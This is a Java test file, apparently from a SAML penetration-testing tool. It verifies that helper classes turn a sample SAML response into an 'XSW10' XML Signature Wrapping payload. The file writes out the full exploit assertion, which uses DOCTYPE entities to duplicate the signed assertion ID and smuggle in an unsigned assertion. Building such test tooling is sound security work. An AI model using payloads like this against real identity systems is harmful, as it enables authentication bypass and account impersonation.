package helpers;

import org.w3c.dom.Document;
import org.xml.sax.SAXException;

import java.io.IOException;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class Xsw10Test {
    public static void main(String[] args) throws SAXException, IOException {
        String originalAssertion =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                        "<Response ID=\"_original_response_ID\">" +
                        "<Issuer>SomeIssuer</Issuer>" +
                        "<Assertion ID=\"_original_assertion_ID\">" +
                        "<Signature>" +
                        "<SignedInfo>" +
                        "<Reference URI=\"#_original_assertion_ID\"/>" +
                        "</SignedInfo>" +
                        "</Signature>" +
                        "<NameID>OriginalName</NameID>" +
                        "</Assertion>" +
                        "</Response>";
        String exploitAssertion = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE response [\n" +
                "<!ENTITY idViaEntity \"_original_assertion_ID\">\n" +
                "<!ENTITY BypassIDUniqueness \"&#x50;\">\n" +
                "]>\n" +
                "<Response ID=\"&idViaEntity;\"><Issuer>SomeIssuer</Issuer><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo><Object xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><Assertion ID=\"&BypassIDUniqueness;_original_assertion_ID\"><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo></Signature><NameID>OriginalName</NameID></Assertion></Object></Signature><Assertion ID=\"_original_assertion_IDffff\"><NameID>OriginalName</NameID></Assertion></Response>";
        XMLHelpers xmlHelpers = new XMLHelpers();
        XSWHelpers xswHelpers = new XSWHelpers();

        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(originalAssertion);
        xswHelpers.applyXSW("XSW10", document);
        String after = xmlHelpers.getString(document);
        String exploit = xswHelpers.applyDOCTYPE(after);
        assertEquals(exploitAssertion, exploit);

    }
}
